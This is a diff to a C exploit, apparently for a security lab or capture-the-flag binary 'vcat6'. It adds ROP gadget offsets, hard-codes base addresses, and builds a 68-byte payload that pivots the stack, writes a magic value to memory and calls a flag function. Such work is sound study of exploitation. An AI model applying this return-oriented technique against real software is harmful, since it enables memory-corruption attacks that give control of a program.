@@ -42,6 +42,14 @@
 #define rnd2_OFF			0x5008
 
 #define flag1_OFF			0x1239
+#define flag2_OFF			0x128d
+
+#define gadget1_OFF			0x122e
+#define gadget2_OFF			0x30a7b
+#define gadget3_OFF			0x43888
+
+//Gadget 2: 0x00043888 : mov dword ptr [edx], ecx ; ret
+//Gadget 3: 0x00030a7b : pop ecx ; pop edx ; ret
 
 // We have exactly 64 bytes to work with in our payload (it's 68 bytes total)
 unsigned char payload[] =
@@ -74,41 +82,61 @@ main(int argc, char **argv)
 	memset(buf, 0, BUF_SZ);
 
 	/* DEBUG MODE ONLY: */
-	// baddr = 0x41000000;
-	// laddr = 0xb7d8d000;
-	// staddr = 0xbffdf000;
+	baddr = 0x41000000;
+	laddr = 0xb7d8d000;
+	staddr = 0xbffdf000;
 
 	/* For NON-DEBUG MODE ONLY:	*/
 
 	/* leak the base address of `vcat6'	*/
-	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
+	// write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
 
-	/* leak the base address of 'libc-2.31.so'	*/
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+	// /* leak the base address of 'libc-2.31.so'	*/
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
 
-	/* leak the base address of the stack	*/
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	staddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+	// /* leak the base address of the stack	*/
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// staddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
 
-	/* sanity check 			*/
-	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
-		if (!baddr || !laddr) {
-			fprintf(stderr,
-				"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
-			fprintf(stderr,
-				"[!] If you are debugging your exploit under GDB "
-				"you need to type in the leaked addresses\n");
-		}
-	}
+	// /* sanity check 			*/
+	// if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
+	// 	if (!baddr || !laddr) {
+	// 		fprintf(stderr,
+	// 			"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
+	// 		fprintf(stderr,
+	// 			"[!] If you are debugging your exploit under GDB "
+	// 			"you need to type in the leaked addresses\n");
+	// 	}
+	// }
 
 	/* Time to create the payload!!!!	*/
 	unsigned long addr_aslr;
-	addr_aslr = baddr + flag1_OFF;
-
+	// Stack pivot
+	addr_aslr = baddr + gadget1_OFF;
 	memcpy(payload + 64, &addr_aslr, sizeof(addr_aslr));
+	
+	// Pop value to write into ecx, then location into edx
+	addr_aslr = laddr + gadget2_OFF;
+	memcpy(payload, &addr_aslr, sizeof(addr_aslr));
+
+	// Value to write into ecx
+	addr_aslr = 0x0defaced;
+	memcpy(payload + 4, &addr_aslr, sizeof(addr_aslr));
+
+	// Location to write into edx
+	addr_aslr = baddr + mgk1_OFF;
+	memcpy(payload + 8, &addr_aslr, sizeof(addr_aslr));
+
+	// Write ecx into edx
+	addr_aslr = laddr + gadget3_OFF;
+	memcpy(payload + 12, &addr_aslr, sizeof(addr_aslr));
+
+	// Invoke flag2
+	addr_aslr = baddr + flag2_OFF;
+	memcpy(payload + 16, &addr_aslr, sizeof(addr_aslr));
 
 	/*
 	 * dump the payload in 'stdout'
